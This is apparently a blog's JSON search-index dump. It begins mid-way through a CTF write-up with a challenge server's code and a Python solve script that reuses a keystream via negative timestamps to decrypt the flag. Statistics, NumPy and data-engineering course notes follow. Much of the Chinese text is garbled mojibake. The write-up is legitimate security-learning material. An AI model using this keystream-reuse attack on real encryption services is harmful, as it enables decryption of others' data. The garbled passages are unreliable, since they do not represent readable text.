timestamp = request.timestamp encrypted_flag = encrypt(flag.encode(), key, timestamp) sessions[session_id] = Session(last_timestamp=timestamp, key=key) return &#123; &quot;session_id&quot;: session_id, &quot;encrypted_flag&quot;: encrypted_flag.hex(), &#125;class EncryptRequest(BaseModel): session_id: str timestamp: int data: str@app.post(&quot;/encrypt&quot;)def route_encrypt(request: EncryptRequest): try: session = sessions[request.session_id] except KeyError: raise HTTPException(status_code=400, detail=&quot;Invalid session id&quot;) try: data = bytes.fromhex(request.data) except ValueError: raise HTTPException(status_code=400, detail=&quot;Invalid hex in data&quot;) if request.timestamp &lt;= session.last_timestamp: raise HTTPException(status_code=400, detail=&quot;Non-increasing timestamp&quot;) session.last_timestamp = request.timestamp return &#123;&quot;encrypted&quot;: encrypt(data, session.key, request.timestamp).hex()&#125;app.mount(&quot;/&quot;, StaticFiles(directory=&quot;static&quot;, html=True), name=&quot;static&quot;) æ‡’å¾—å†™WPäº†ï¼Œå…ˆæŠŠä»£ç ä»è¿™é‡Œã€‚ 1234567891011121314151617181920212223242526272829303132333435363738import requests, binasciiBASE = &quot;https://clandescriptorius.challs.pwnoh.io&quot;def hex2bytes(h): return binascii.unhexlify(h)def bytes2hex(b): return binascii.hexlify(b).decode()r = requests.post(f&quot;&#123;BASE&#125;/startsession&quot;, json=&#123;&quot;timestamp&quot;: -12&#125;)r.raise_for_status()j = r.json()sid = j[&quot;session_id&quot;]ct_flag = hex2bytes(j[&quot;encrypted_flag&quot;])blocks = [ct_flag[i:i+16] for i in range(0, len(ct_flag), 16)]n = len(blocks)js = [int(&quot;2&quot;+str(i)) for i in range(n)]max_j = max(js)total_blocks = max_j + 1pt = b&quot;\\x00&quot; * (16 * total_blocks)r2 = requests.post(f&quot;&#123;BASE&#125;/encrypt&quot;, json=&#123; &quot;session_id&quot;: sid, &quot;timestamp&quot;: -1, &quot;data&quot;: bytes2hex(pt)&#125;)r2.raise_for_status()ct = hex2bytes(r2.json()[&quot;encrypted&quot;])ks_blocks = [ct[16*j:16*(j+1)] for j in js]pt_blocks = [bytes(a ^ b for a,b in zip(blocks[i], ks_blocks[i])) for i in range(n)]pt_all = b&quot;&quot;.join(pt_blocks)pad = pt_all[-1]flag = pt_all[:-pad]print(&quot;Decrypted:&quot;, flag.decode(errors=&quot;replace&quot;))# Decrypted: bctf&#123;the_future_is_now_e3faa77c672e6d62&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]},{"title":"Foundamentals of Mathematical Statistics","slug":"TUM  æ•°å­¦ ç¬”è®°/ç»Ÿè®¡ Statistics/Foundamentals-of-Mathematical-Statistics","date":"2025-10-25T14:44:16.000Z","updated":"2025-10-25T21:54:26.913Z","comments":true,"path":"2025/10/25/TUM  æ•°å­¦ ç¬”è®°/ç»Ÿè®¡ Statistics/Foundamentals-of-Mathematical-Statistics/","permalink":"https://archer-baiyi.github.io/2025/10/25/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/%E7%BB%9F%E8%AE%A1%20Statistics/Foundamentals-of-Mathematical-Statistics/","excerpt":"ç»Ÿè®¡ç›¸å…³ç¬”è®°","text":"IntroDefinition (meanï¼ˆå¹³å‡å€¼ï¼‰): The sample meanï¼ˆå¹³å‡å€¼ï¼‰ of observed values $x_1,â€¦,x_n \\in \\mathbb{R}$ is \\bar{x}_n = \\frac{1}{n}\\sum^n_{i=1}x_i. ç”¨sampleæŠŠå®ƒå’Œæ¦‚ç‡è®ºé‡Œçš„mean/expectationåŒºåˆ†ä¸€ä¸‹ã€‚ Definition (medianï¼ˆä¸­ä½æ•°ï¼‰): The sample medianï¼ˆä¸­ä½æ•°ï¼‰ of observed values is x_{0.5} =\\begin{cases}x_{\\frac{n+1}{2}}, & \\text{if $n$ odd}, \\\\[1em]\\dfrac{1}{2}\\Bigl[x_{\\frac{n}{2}} + x_{\\frac{n}{2}+1}\\Bigr], & \\text{if $n$ even},\\end{cases}with $x_1 \\leq x_2 \\leq â€¦ \\leq x_n$ being the sorted data points. å¦‚æœæ€»æ•°ä¸ºåŸºæ•°ï¼Œå°±å–æœ€ä¸­é—´çš„é‚£ä¸ªæ•°ï¼›å¦‚æœæ€»æ•°æ˜¯å¶æ•°ï¼Œé‚£å°±å–ä¸­é—´2ä¸ªçš„å¹³å‡å€¼ã€‚ Definition (Statistical model ç»Ÿè®¡æ¨¡å‹): \\mathcal{P} = \\text{a set of probability distributions } P \\text{ on } (X,A). Definition (Parameter): A (statistical) parameter of a statistical model $\\mathcal{P}$ is a map $\\gamma : \\mathcal{P} \\to \\text{ some set }\\Tau$ . ä¾‹å­ï¼š - æœŸæœ›å€¼ Mean/expectation \\gamma(P) = \\int x dP(x)- Variance \\gamma(P) = \\int x^2 dP(x) - (\\int x dP(x))^2- Correlations Construction of EstimatorsDefinition (Estimators): A estimator is a function that map data to estimates of quantities of interest. ç®€å•æ¥è®²ï¼Œestimatorå°±æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„å®šä¹‰åŸŸæ˜¯æ•°æ®ï¼Œå«estimandï¼Œå®ƒçš„å€¼åŸŸé‡Œçš„å…ƒç´ åˆ™æ˜¯å«estimatesã€‚ Plug-in EstimatorDefinition (empirical distribution): The empirical distribution of $x_1, \\ldots, x_n \\in \\mathbb{R}$ is the probability distribution $\\hat{P}_n$ given by\\hat{P}_n(A) := \\frac{1}{n} \\#\\{ i : x_i \\in A \\}= \\frac{1}{n} \\sum_{i=1}^n \\mathbf{1}_{\\{ x_i \\in A \\}}, \\qquad A \\subseteq \\mathbb{R}. ä¸€ä¸ªç›¸å¯¹ç¦»æ•£çš„æ¦‚ç‡åˆ†å¸ƒã€‚ Definition (empirical distribution function (ecdf)): The empirical distribution function (ecdf) of $x_1, \\ldots, x_n$is the distribution function of $\\hat{P}_n$, which is\\hat{F}_n(t) := \\frac{1}{n} \\sum_{i=1}^n \\mathbf{1}_{\\{ x_i \\le t \\}},\\qquad t \\in \\mathbb{R}. ä¸€ä¸ªè¿ç»­çš„åˆ†å¸ƒå‡½æ•°ã€‚ Theorem (Glivenkoâ€”Cantelli): If $X_1, X_2, \\ldots$ are i.i.d. random variables with cdf (cumulative distribution function) $F$, then\\lVert \\hat{F}_n - F \\rVert_\\infty:= \\sup_{t \\in \\mathbb{R}} \\bigl| \\hat{F}_n(t; X_1, \\ldots, X_n) - F(t) \\bigr|\\xrightarrow{\\text{a.s.}} 0. ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬æœ‰è¶³å¤Ÿå¤šçš„æ ·æœ¬æ—¶ï¼Œè¿™ä¸ªesimatorä¼šè¶‹è¿‘äºå®ƒåŸæœ¬çš„åˆ†å¸ƒã€‚ Theorem: If $U \\sim Unif(0,1)$,then $X:=F^{-1}(U)$ has cdf $F$. Definition: The plug-in estimator of $\\gamma(F)$ is the estimator $\\hat{\\gamma} = \\gamma(\\hat{F_n})$. ä¾‹å­ï¼š è€ƒè™‘æœŸæœ›å€¼ $\\gamma(F) = \\int x dF(x)$ã€‚é‚£ä¹ˆæœ‰ \\gamma(\\hat{F_n}) = \\int x d\\hat{F_n}(x) = \\frac{1}{n} \\sum_{i=1}^n X_i = \\overline{X}_nM-EstimatorDefinition (M-estimator): An estimator $\\hat{\\theta}(X_1, \\ldots, X_n)$ maximizing a criterion function of the form\\theta \\;\\mapsto\\; \\frac{1}{n} \\sum_{i=1}^n m_\\theta(X_i),where $m_\\theta$ is a known function, is called an M-estimator (maximum-likelihood type). ä¾‹å­ï¼š - $\\theta \\in \\mathbb{R}$, å¦‚æœé€‰$m_\\theta(x) = -(x - \\theta)^2$ï¼Œé‚£ä¹ˆå°±ä¼šå¾—åˆ°å¹³å‡å€¼ $\\bar{X}_n$ã€‚ - é€‰$m_\\theta(x) = -|x - \\theta|$ï¼Œä¼šå¾—åˆ°ä¸­ä½æ•°ã€‚ Method of Moments (MOM)Given a parametric model for real-valued observations X_1,...,X_n \\overset{i.i.d}{\\sim}P_\\theta, \\ \\ \\theta \\in \\Theta \\subseteq \\mathbb{R}^kconsider the moments \\mu_j(\\theta) = E_\\theta [X^j_i] \\text{ for } j=1,...,k.If it exists then the $j$-th moment may be estimated by \\hat{\\mu}_j = \\frac{1}{n}\\sum^n_{i=1}X^j_i.Definition: The MOM estimator $\\hat{\\theta}$ is the value of $\\theta$ that solves the equation system\\mu_j(\\theta) = \\hat{\\mu}_j, \\ \\ j =1,...,k. E_\\theta [X^j_i] = \\frac{1}{n}\\sum^n_{i=1}X^j_i. ä¾‹å­ï¼ˆé«˜æ–¯ï¼‰ï¼š Suppose $P_\\theta = \\mathcal{N}(\\mu, \\sigma^2)$ with mean and variance unknown.So, \\theta = (\\mu, \\sigma^2) \\in \\Theta = \\mathbb{R} \\times (0,\\infty).The density: p_\\theta(x) = \\frac{1}{\\sqrt{2\\pi\\sigma^2}} \\exp\\left\\{ -\\frac{1}{2\\sigma^2} (x - \\mu)^2 \\right\\}, \\qquad x \\in \\mathbb{R}.éœ€è¦è§£çš„æ–¹ç¨‹ç»„ï¼š \\mu_1(\\theta) = \\mathbb{E}_\\theta[X_1] = \\mu \\;\\stackrel{!}{=}\\; \\overline{X}_n, \\mu_2(\\theta) = \\mathrm{Var}_\\theta[X_1] + \\big(\\mathbb{E}_\\theta[X_1]\\big)^2 = \\sigma^2 + \\mu^2 \\;\\stackrel{!}{=}\\; \\hat{\\mu}_2.æœ€åå¾—åˆ°sample meanä»¥åŠempirical varianceï¼š \\hat{\\mu} = \\overline{X}_n, \\hat{\\sigma}^2 = \\hat{\\mu}_2 - (\\overline{X}_n)^2 = \\frac{1}{n} \\sum_{i=1}^n X_i^2 - \\left( \\frac{1}{n} \\sum_{i=1}^n X_i \\right)^2 = \\frac{1}{n} \\sum_{i=1}^n (X_i - \\overline{X}_n)^2.Maximum Likelihood Estimator (MLE)Consider a parametric model for the observation X \\sim P_\\theta, \\qquad \\theta \\in \\Theta \\subseteq \\mathbb{R}^k.Assume the model $\\mathcal{P} = \\{ P_\\theta : \\theta \\in \\Theta \\}$ is dominated by a $\\sigma$-finite measure $\\nu$, i.e., $P_\\theta \\ll \\nu$ for all $\\theta \\in \\Theta$, and so we have densities p_\\theta(x) = \\frac{\\mathrm{d} P_\\theta}{\\mathrm{d} \\nu}(x), \\qquad x \\in \\mathcal{X}.ï¼ˆè¿™ä¸ªsoçš„ç»“è®ºæ˜¯æ¦‚ç‡è®ºé‡Œçš„ç»“è®ºã€‚ï¼‰ Definition: The function $L_x(\\theta) = p_\\theta(x)$ is the likelihood function of model $\\mathcal{P}$ for the data $x$. æœ‰å¯†åº¦å‡½æ•°ç›´æ¥å¥—å¯†åº¦å‡½æ•°ï¼ˆdensity functionï¼‰ã€‚ Definition: The maximum likelihood estimate (MLE) of $\\theta$ is\\hat{\\theta} = \\arg \\max_{\\theta \\in \\Theta} L_x(\\theta). If $\\hat{\\theta}(X)$ is a measurable function of the observation $X$, then $\\hat{\\theta}(X)$ is called maximum likelihood estimator (MLE) of $\\theta$. åªä¸è¿‡æˆ‘ä»¬é€šå¸¸å…¶å®ä¼šè€ƒè™‘æ‰€è°“çš„ log -likelihood function \\ell_x (\\theta) = \\text{log}L_x(\\theta).è¿™æ ·åšæœ‰2ç‚¹å¥½å¤„ï¼š å¯ä»¥é¿å…numerical overflowï¼› æ›´æ–¹ä¾¿è®¡ç®—ã€‚ï¼ˆæ¯”å¦‚è¯´å¦‚æœ$L_x$æœ¬èº«æ˜¯productçš„å½¢å¼ï¼Œé‚£$l_x$åˆ™ä¼šå˜æˆsumçš„å½¢å¼ã€‚ï¼‰ ä¾‹å­ï¼ˆé«˜æ–¯ï¼‰ï¼š Suppose $X_1, \\ldots, X_n$ i.i.d. $\\mathcal{N}(\\mu, \\sigma^2)$, so $\\theta = (\\mu, \\sigma^2) \\in \\mathbb{R} \\times (0,\\infty)$. Assume $n \\ge 2$, so that $\\frac{1}{n} \\sum_{i=1}^n (X_i - \\overline{X}_n)^2 &gt; 0\\quad \\text{a.s.}$. The log -likelihood functionï¼š \\begin{align*} \\ell_X(\\theta) &= \\sum_{i=1}^n \\log \\left( \\frac{1}{\\sqrt{2\\pi \\sigma^2}} \\exp\\left\\{ -\\frac{1}{2\\sigma^2}(X_i - \\mu)^2 \\right\\} \\right) \\\\ &= -\\frac{n}{2}\\log(2\\pi) - \\frac{n}{2}\\log(\\sigma^2) - \\frac{1}{2\\sigma^2} \\sum_{i=1}^n (X_i - \\mu)^2. \\end{align*}ä¸éš¾å¾—åˆ°ï¼š \\hat{\\mu} = \\arg\\min_{\\mu \\in \\mathbb{R}} \\sum_{i=1}^n (X_i - \\mu)^2 = \\overline{X}_n, \\hat{\\sigma}^2 = \\arg\\min_{\\sigma^2 > 0} \\left[ \\log(\\sigma^2) + \\frac{1}{\\sigma^2} \\cdot \\frac{1}{n} \\sum_{i=1}^n (X_i - \\overline{X}_n)^2 \\right] = \\frac{1}{n} \\sum_{i=1}^n (X_i - \\overline{X}_n)^2.è´å¶æ–¯ä¼°è®¡ï¼ˆBayes Estimatorsï¼‰åœ¨ä¹‹å‰çš„æ„é€ é‡Œï¼Œæ‰€æœ‰å‚æ•°éƒ½å–å†³äºæˆ‘ä»¬æ‹¿åˆ°çš„æ•°æ®ï¼Œå®Œå…¨ä¸å—æˆ‘ä»¬ä»»ä½•ç»éªŒ/å‰ç½®çŸ¥è¯†çš„å½±å“ã€‚ ä½†æˆ‘ä»¬ç°åœ¨å¸Œæœ›ä¿®æ”¹è¿™ä¸ªæ¨¡å¼ï¼šæˆ‘ä»¬å¸Œæœ›æœ€åå¾—åˆ°çš„å‚æ•°åŒæ—¶å–å†³äºæ•°æ®ä»¥åŠæˆ‘ä»¬çš„ç»éªŒ/å…ˆå‰çš„åˆ¤æ–­ã€‚ è´å¶æ–¯æ¨æ–­ï¼ˆBayesian Inferenceï¼‰çš„æµç¨‹ï¼š 1. æŠŠå…ˆå‰çš„å¸¸æ•°å€¼$\\theta$å½“ä½œrandom variableï¼ˆéšæœºå˜é‡ï¼‰ï¼Œå¹¶é€‰æ‹©ä¸€ä¸ªprior distributionï¼ˆå…ˆéªŒåˆ†å¸ƒï¼Œå³æˆ‘ä»¬è§‚å¯Ÿæ•°æ®å‰çš„åšå‡ºçš„åˆ¤æ–­ï¼‰ã€‚ 2. æŠŠ$P_\\theta$ å½“ä½œ the conditional distribution of $X$ given $\\theta$ã€‚ 3. åœ¨è§‚å¯Ÿåˆ°äº†æ•°æ® $x$ ä¹‹åï¼Œåšç»Ÿè®¡æ¨æ–­æ—¶ï¼Œçœ‹ $\\theta$ çš„åéªŒåˆ†å¸ƒï¼ˆposterior distributionï¼‰ï¼Œä¹Ÿå°±æ˜¯ â€œåœ¨è§‚æµ‹åˆ° $X = x$ ä¹‹åï¼Œ$\\theta$ çš„æ¡ä»¶åˆ†å¸ƒâ€ã€‚ Consider an observation modeled as $X\\sim P_\\theta, \\theta \\in \\Theta \\subseteq \\mathbb{R}.$ Theorem (Bayes theorem): Suppose the prior distribution has density $\\pi$ w.r.t. a measure $\\nu$ and$P_\\theta \\ll \\nu \\ \\ \\forall \\theta$ with densities $p_\\theta(x) = p(x \\mid \\theta)$.Then the posterior distribution has density (w.r.t. $\\nu$):p(\\theta \\mid x)= \\frac{p(x \\mid \\theta)\\,\\pi(\\theta)}{p(x)} ,wherep(x) = \\int_\\Theta p(x \\mid \\theta)\\,\\pi(\\theta)\\, \\mathrm{d}\\nu(\\theta)is the prior predictive density of $X$. Bayes estimators of $\\theta$ are obtained as characteristics of the posterior distribution.Most frequently, one considers the posterior mean: \\hat{\\theta} = \\mathbb{E}[\\theta \\mid X = x] = \\int \\theta \\cdot p(\\theta \\mid x) \\,\\mathrm{d}\\nu(\\theta).ä¾‹å­ï¼ˆé«˜æ–¯ï¼‰ï¼š Assume $X_1, \\ldots, X_n$ i.i.d.\\ $\\mathcal{N}(\\mu, \\sigma^2)$ with $\\sigma^2 &gt; 0$ known. We select as prior distribution $\\mu \\sim \\mathcal{N}(m, \\tau^2)$ so \\pi(\\mu) = \\frac{1}{\\sqrt{2\\pi\\tau^2}} \\exp\\!\\left( -\\frac{1}{2\\tau^2}(\\mu - m)^2 \\right).The likelihood function is equal to L_X(\\mu) = \\prod_{i=1}^n \\frac{1}{\\sqrt{2\\pi\\sigma^2}} \\exp\\!\\left( -\\frac{1}{2\\sigma^2} (X_i - \\mu)^2 \\right).The posterior density is p(\\mu \\mid X) \\propto L_X(\\mu)\\,\\pi(\\mu) \\propto \\exp\\!\\left( -\\frac{1}{2\\sigma^2} \\sum_{i=1}^n (X_i - \\mu)^2 -\\frac{1}{2\\tau^2} (\\mu - m)^2 \\right) \\qquad \\text{(quadratic in $\\mu$)}.We recognize that the posterior distribution will be a normal distribution.More precisely, \\begin{align*} p(\\mu \\mid X) &\\propto \\exp\\!\\left\\{ -\\frac{1}{2\\sigma^2} \\Bigl( n\\cdot \\mu^2 - 2\\mu \\sum_{i=1}^n X_i \\Bigr) -\\frac{1}{2\\tau^2}(\\mu^2 - 2\\mu m) \\right\\}\\\\ &= \\exp\\!\\left\\{ \\Bigl( -\\frac{n}{2\\sigma^2} - \\frac{1}{2\\tau^2} \\Bigr)\\mu^2 -2\\mu \\Bigl( -\\frac{n\\overline{X}_n}{2\\sigma^2} - \\frac{m}{2\\tau^2} \\Bigr) \\right\\}\\\\ &= \\exp\\!\\left\\{ a \\mu^2 - 2 b \\mu \\right\\}, \\end{align*}where a = -\\frac{n}{2\\sigma^2} - \\frac{1}{2\\tau^2}, \\qquad b = \\frac{n\\overline{X}_n}{2\\sigma^2} - \\frac{m}{2\\tau^2}.We conclude that since $p(\\mu \\mid X) \\propto \\exp\\{ a \\cdot (\\mu - b/a)^2 \\}$,it holds that $p(\\mu \\mid X)$ is the density of a normal distribution with mean and variance: \\mathbb{E}[\\mu \\mid X] = \\frac{b}{a}, \\qquad \\mathrm{Var}[\\mu \\mid X] = -\\frac{1}{2a}.The posterior mean is a convex combination of $\\overline{X}_n$ and the prior mean $m$: \\begin{align*} \\mathbb{E}[\\mu \\mid X] = \\frac{b}{a} &= \\frac{\\frac{n\\overline{X}_n}{2\\sigma^2} - \\frac{m}{2\\tau^2}} {-\\frac{n}{2\\sigma^2} - \\frac{1}{2\\tau^2}}\\\\ &= \\overline{X}_n \\cdot \\frac{n/\\sigma^2}{n/\\sigma^2 + 1/\\tau^2} + m \\cdot \\frac{1/\\tau^2}{n/\\sigma^2 + 1/\\tau^2}\\\\ &= \\overline{X}_n \\cdot \\frac{\\tau^2}{\\tau^2 + \\sigma^2/n} + m \\cdot \\frac{\\sigma^2/n}{\\tau^2 + \\sigma^2/n}. \\end{align*}å½“æˆ‘ä»¬è®¾ï¼š \\lambda = \\frac{\\tau^2}{\\tau^2 + \\sigma^2/n}åˆ™æœ‰ï¼š \\mathbb{E}[\\mu \\mid X] = \\lambda \\cdot\\overline{X}_n + (1-\\lambda)m.æ³¨æ„åˆ°å½“nè¶‹è¿‘äºæ— ç©·æ—¶ï¼Œ$\\lambda$ä¼šè¶‹è¿‘äº1ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“nè¶Šå¤§ï¼Œæœ€åç®—å‡ºæ¥çš„meanå°±ä¼šè¶Šå–å†³äºæˆ‘ä»¬æ‹¿åˆ°çš„æ•°æ®ã€‚åä¹‹ï¼Œnè¶Šå°ï¼Œåˆ™ä¼šæ›´å–å†³äºæˆ‘ä»¬çš„å…ˆéªŒçŸ¥è¯†ã€‚ Mean Square Error, Bias and VarianceDefinition: The mean square error is defined as\\mathrm{MSE}_\\theta[\\hat{\\theta}]:= \\mathbb{E}_\\theta \\big[ (\\hat{\\theta} - \\theta)^2 \\big]= \\int_{\\mathcal{X}} (\\hat{\\theta}(x) - \\theta)^2 \\, \\mathrm{d}P_\\theta(x). Theorem: The mean square error decomposes as\\mathrm{MSE}_\\theta[\\hat{\\theta}]= \\big( \\mathrm{Bias}_\\theta[\\hat{\\theta}] \\big)^2+ \\mathrm{Var}_\\theta[\\hat{\\theta}],where $\\mathrm{Bias}_\\theta[\\hat{\\theta}]:= \\mathbb{E}_\\theta[\\hat{\\theta}] -\\theta$ is the bias of $\\hat{\\theta}.$ Proof: Write $\\mathrm{MSE}_\\theta[\\hat{\\theta}]= \\mathbb{E}_\\theta\\Big[\\big(\\hat{\\theta} - \\mathbb{E}_\\theta[\\hat{\\theta}] + \\mathbb{E}_\\theta[\\hat{\\theta}] - \\theta \\big)^2 \\Big] $ and expand \\begin{align*} \\mathrm{MSE}_\\theta[\\hat{\\theta}] &= \\mathbb{E}_\\theta \\Big[ \\big(\\hat{\\theta} - \\mathbb{E}_\\theta[\\hat{\\theta}]\\big)^2 \\Big] + \\mathbb{E}_\\theta \\Big[ \\big(\\mathbb{E}_\\theta[\\hat{\\theta}] - \\theta\\big)^2 \\Big] + 2 \\, \\mathbb{E}_\\theta \\Big[ \\big(\\hat{\\theta} - \\mathbb{E}_\\theta[\\hat{\\theta}]\\big) \\big(\\mathbb{E}_\\theta[\\hat{\\theta}] - \\theta\\big) \\Big].\\\\ &= \\mathrm{Var}_\\theta[\\hat{\\theta}] + \\big(\\mathrm{Bias}_\\theta[\\hat{\\theta}]\\big)^2 + 2 \\cdot \\mathrm{Bias}_\\theta[\\hat{\\theta}] \\cdot \\underbrace{ \\mathbb{E}_\\theta \\big[ \\hat{\\theta} - \\mathbb{E}_\\theta[\\hat{\\theta}] \\big] }_{=0}\\\\ &= \\mathrm{Var}_\\theta[\\hat{\\theta}] + \\big(\\mathrm{Bias}_\\theta[\\hat{\\theta}]\\big)^2. \\end{align*}$\\square$","categories":[{"name":"TUM æ•°å­¦ ç¬”è®°","slug":"TUM-æ•°å­¦-ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"ç»Ÿè®¡ Statistics","slug":"TUM-æ•°å­¦-ç¬”è®°/ç»Ÿè®¡-Statistics","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/%E7%BB%9F%E8%AE%A1-Statistics/"}],"tags":[{"name":"ç»Ÿè®¡","slug":"ç»Ÿè®¡","permalink":"https://archer-baiyi.github.io/tags/%E7%BB%9F%E8%AE%A1/"},{"name":"Statistics","slug":"Statistics","permalink":"https://archer-baiyi.github.io/tags/Statistics/"}]},{"title":"Pythonçš„Numpyåº“","slug":"TUM  æ•°å­¦ ç¬”è®°/Machine Learning/Pythonçš„Numpyåº“","date":"2025-10-23T22:01:05.000Z","updated":"2025-10-23T22:05:27.994Z","comments":true,"path":"2025/10/24/TUM  æ•°å­¦ ç¬”è®°/Machine Learning/Pythonçš„Numpyåº“/","permalink":"https://archer-baiyi.github.io/2025/10/24/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/Machine%20Learning/Python%E7%9A%84Numpy%E5%BA%93/","excerpt":"Pythonçš„Numpyåº“å¸¸ç”¨å‡½æ•°","text":"å®˜æ–¹å¿«é€Ÿä¸Šæ‰‹æŒ‡å—ï¼šhttps://numpy.org/doc/stable/user/quickstart.html Basics","categories":[{"name":"TUM æ•°å­¦ ç¬”è®°","slug":"TUM-æ•°å­¦-ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"Machine Learning æœºå™¨å­¦ä¹ ","slug":"TUM-æ•°å­¦-ç¬”è®°/Machine-Learning-æœºå™¨å­¦ä¹ ","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/Machine-Learning-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://archer-baiyi.github.io/tags/Python/"},{"name":"Numpy","slug":"Numpy","permalink":"https://archer-baiyi.github.io/tags/Numpy/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://archer-baiyi.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://archer-baiyi.github.io/tags/Machine-Learning/"}]},{"title":"02 Basic Building Blocks","slug":"TUM info ç¬”è®°/Data Engeering/02-Basic-Building-Blocks","date":"2025-10-19T15:22:00.000Z","updated":"2025-10-19T19:11:51.859Z","comments":true,"path":"2025/10/19/TUM info ç¬”è®°/Data Engeering/02-Basic-Building-Blocks/","permalink":"https://archer-baiyi.github.io/2025/10/19/TUM%20info%20%E7%AC%94%E8%AE%B0/Data%20Engeering/02-Basic-Building-Blocks/","excerpt":"","text":"æ–‡ä»¶æ ¼å¼ File Formatså¸¸è§çš„å­˜å‚¨æ•°æ®çš„æ–‡ä»¶æ ¼å¼ï¼š CSVçº¯æ–‡æœ¬æ–‡ä»¶ï¼ŒåŒ…å«ä¸€è¡Œè¡Œæ•°æ®ï¼ˆé€—å·åˆ†éš”ï¼‰ã€‚ A plain text file contains rows of data (comma separated values)ã€‚ ä¾‹å­ï¼š 12Sherlock Holmes,221B Baker Street,DetectiveJames Moriarty,Reichenbach Falls,Villain ç®€å•ã€å¯è¯»æ€§å¥½ éå¸¸æµè¡Œã€åº”ç”¨å¹¿ ä½†ç»†èŠ‚å¾ˆå¤š åˆ†éš”ç¬¦å¯è‡ªå®šä¹‰ï¼ˆå¦‚ç”¨ Tab çš„ TSVï¼‰ å­—æ®µé‡Œè‹¥å«æœ‰åˆ†éš”ç¬¦éœ€è¦åŠ å¼•ç”¨ï¼ˆå¼•å·ï¼‰ å¦‚æœå­—ç¬¦ä¸²å†…éƒ¨å†åŒ…å«å¼•å·ï¼Œéœ€è¦è½¬ä¹‰ï¼š&quot;string with &quot;&quot; inside&quot; é€‚åˆï¼šæ‰å¹³è¡¨æ ¼æ•°æ®ï¼ˆè¡Œåˆ—ç»“æ„ï¼‰ï¼Œä¸ Excel/æ•°æ®åº“å¯¼å…¥å¯¼å‡ºï¼›ä¸é€‚åˆå¤æ‚åµŒå¥—ã€‚ XMLä¸€ç§ç”¨äºç¼–ç ï¼ˆåŠï¼‰ç»“æ„åŒ–æ•°æ®çš„æ–‡æœ¬æ ¼å¼ã€‚ A text format encoding (semi-)structured dataã€‚ ä¾‹å­ 1234&lt;characters&gt;&lt;person name=â€œSherlock Holmesâ€ address=â€œ221B Baker Streetâ€ job=â€œDetectiveâ€/&gt;&lt;person name=â€œJames Moriartyâ€ address=â€œReichenbach Fallsâ€ job=â€œVillainâ€/&gt;&lt;/characters&gt; æ ¼å¼æœ¬èº«æ¯” CSV æ ‡å‡†åŒ–å¾—æ›´å¥½ ä¹Ÿé€‚åˆè¡¨ç¤ºåµŒå¥—æ•°æ® äººç±»å¯è¯»ï¼Œä½†ä¸å¤ªå¥½æ‰‹å†™ å¾ˆå†—é•¿ï¼Œå®Œæ•´ XML è§„èŒƒä¹Ÿå¾ˆå¤æ‚ æ”¯æŒé«˜çº§ç‰¹æ€§ï¼ˆå¦‚ XML Schemaï¼‰ï¼Œä½†ä¸å¸¸ç”¨ æœ‰ä¸€å®šæµè¡Œåº¦ï¼Œä½†åœ¨èµ°ä¸‹å¡è·¯ JSONæºè‡ª JavaScript å¯¹è±¡è¡¨ç¤ºæ³•çš„æ–‡æœ¬æ ¼å¼ã€‚ A text format stemming from JavaScript Object Notationã€‚ ä¾‹å­ 12345[ &#123;&quot;name&quot;:&quot;Sherlock Holmes&quot;, &quot;address&quot;:&quot;221B Baker Street&quot;, &quot;job&quot;:&quot;Detective&quot;&#125;, &#123;&quot;name&quot;:&quot;James Moriarty&quot;, &quot;address&quot;:&quot;Reichenbach Falls&quot;, &quot;job&quot;:&quot;Villain&quot;&#125;] ç”¨é€”ä¸ XML ç±»ä¼¼ ä½†æ ¼å¼æ›´ç®€å• æ›´ä¸å•°å—¦ï¼ˆverboseï¼‰ã€æ›´æ˜“ä¹¦å†™ æ­£åœ¨å˜å¾—è¶Šæ¥è¶Šæµè¡Œ å‘½ä»¤è¡Œå·¥å…· Command Line ToolsText files are quite popular because they are human readable and easy to use. è¿™éƒ¨åˆ†ä¸»è¦è®²å¦‚ä½•åˆ©ç”¨å‘½ä»¤è¡Œå·¥å…·å¤„ç†txtæ–‡ä»¶ã€‚ ç»„åˆå·¥å…·ï¼ˆCombining Toolsï¼‰æ¯ä¸ªç¨‹åºéƒ½æœ‰ä¸€ä¸ªè¾“å…¥æµï¼ˆinput streamï¼‰ä»¥åŠè¾“å‡ºæµï¼ˆoutput streamï¼‰ã€‚å¯ä»¥å°†å¤šä¸ªå‘½ä»¤ç»„åˆèµ·æ¥ï¼š æŠŠä¸¤ä¸ªå‘½ä»¤è¿æ¥èµ·æ¥ï¼ˆConcatenating bothï¼‰ï¼š 1command 1 | command 2 æŠŠè¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ï¼ˆRedirecting to a fileï¼‰ï¼š 1command &gt; file ä»æ–‡ä»¶é‡å®šå‘ä¸ºè¾“å…¥ï¼ˆRedirecting from a fileï¼‰ï¼š 1command &lt; file é”™è¯¯æµï¼ˆerror stramï¼‰ï¼š 1command 2 &gt; /dev/null Unix æµç¼–å·ï¼š0â€”æ ‡å‡†è¾“å…¥ stdinï¼Œ1â€”æ ‡å‡†è¾“å‡º 